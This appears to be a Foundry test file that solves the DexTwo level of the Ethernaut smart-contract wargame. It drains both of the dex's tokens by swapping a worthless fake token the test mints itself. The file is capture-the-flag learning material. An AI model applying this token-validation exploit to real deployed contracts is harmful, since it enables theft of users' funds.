// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/23-DexTwo/DexTwoFactory.sol";

contract DexTwoTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1); // generate random-looking address with given private key

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        // vm.deal(hacker, 1 ether);
    }

    function testDexTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        assert(ethernautDexTwo.balanceOf(ethernautDexTwo.token1(), hacker) > 0);
        assert(ethernautDexTwo.balanceOf(ethernautDexTwo.token2(), hacker) > 0);
        FakeToken fakeToken = new FakeToken("YouGotScammed", "YGS");
        fakeToken.transfer(address(ethernautDexTwo), 10);
        fakeToken.approve(address(ethernautDexTwo), 100);
        ethernautDexTwo.swap(address(fakeToken), ethernautDexTwo.token1(), 10);
        ethernautDexTwo.swap(address(fakeToken), ethernautDexTwo.token1(), 40);
        fakeToken.approve(address(ethernautDexTwo), 100);
        ethernautDexTwo.swap(address(fakeToken), ethernautDexTwo.token2(), 60);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
